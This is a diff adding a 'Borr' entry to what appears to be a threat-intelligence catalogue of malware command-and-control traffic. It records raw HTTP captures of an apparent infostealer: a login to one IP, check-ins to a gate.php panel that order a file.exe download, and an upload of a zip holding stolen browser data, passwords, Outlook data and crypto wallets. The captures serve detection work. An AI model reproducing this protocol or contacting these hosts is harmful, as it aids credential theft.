@@ -264,6 +264,85 @@ BlackRAT.Data.....data.bytes.............16310D190E2C4918020E52	..........$...MZ
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/blackrat.png "Blackrat")
 
+#### Borr
+~~~
+HTTP/1.1 100 Continue
+
+POST /Auth/index.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Host: 92.63.197.188
+Content-Length: 203
+Expect: 100-continue
+Connection: Keep-Alive
+
+type=login&username=n3L9rdjJe47G%2bCRzL%2fTwmQ%3d%3d&password=n3L9rdjJe47G%2bCRzL%2fTwmQ%3d%3d&hwid=lsd&session_id=ejQ5U3JwREpZV0k4d21DTU85WHdlTXVTN2lEQ2hkMzI%3d&session_salt=ejQ5U3JwREpZV0k4d21DTQ%3d%3d
+
+HTTP/1.1 200 OK
+Date: Thu, 30 Jan 2020 01:53:02 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Content-Length: 24
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+ZZRTKdEbowHH5njhG6UW5w==
+
+GET /gate.php HTTP/1.1
+Host: 5.188.60.21
+Connection: Keep-Alive
+
+HTTP/1.1 200 OK
+Date: Thu, 30 Jan 2020 01:53:02 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Content-Length: 56
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+
+1,1,1,1,1,1,1,2,1,txt;cs;mp3;,https://url.com/file.exeHTTP/1.1 200 OK
+Date: Thu, 30 Jan 2020 01:53:02 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Content-Length: 56
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+1,1,1,1,1,1,1,2,1,txt;cs;mp3;,https://url.com/file.exeHTTP/1.1 100 Continue
+
+POST /gate.php?id=1&os=Windows%207&cookie=10&pswd=3&version=v1.0%20Beta&cc=0&autofill=2&hwid=90059C37132041A4B58D2B75A9850D2F HTTP/1.1
+Content-Type: multipart/form-data; boundary=---------------------8d7a52725dea892
+Host: 5.188.60.21
+Content-Length: 60824
+Expect: 100-continue
+
+-----------------------8d7a52725dea892
+Content-Disposition: form-data; name="file"; filename="381.zip"
+Content-Type: application/octet-stream
+
+PK..........>P\ZWW..........$.Browsers.txt
+. .........0.5.....0.5.....0.5.....s..	-N-*.IL....q,(pI,I...ON..q..O.I.q.(..M..S..*8..).%5-.4.D.,.Y..a.B.y....._.......Y..._..P.....Z..).t....TV.....@........U....mA..@n:..#..d...PK..........>P~
+......L.....$.Domains.txt
+. .........0.5.....0.5.....0.5.....+//.......I../J..*G. ...PK..........>Pr.............$.Outlook.txt
+. ..........[:......[:......[:.......,.I..s.,I......PK..........>P^.]I........
+.$.Passwords.txt
+. .........0.5.....0.5.....0.5.......A.. .E.$....4...+S.q..+`.....0XOoMl....'...5.).s..8;b.Jpv....p8..MX......."......63'.>..{...
+. .........0.5.....................PK..-.........>P..............$........ ......CryptoWallets/
+. ..........[:......[:......[:.....PK...........
+........
+-----------------------8d7a52725dea892--
+
+HTTP/1.1 200 OK
+Date: Thu, 30 Jan 2020 01:53:05 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Content-Length: 56
+Content-Type: text/html; charset=UTF-8
+
+1,1,1,1,1,1,1,2,1,txt;cs;mp3;,https://url.com/file.exe
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/borr1.png "Borr")
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/borr2.png "Borr")
+
 #### Brushaloader
 ~~~
 POST / HTTP/1.1
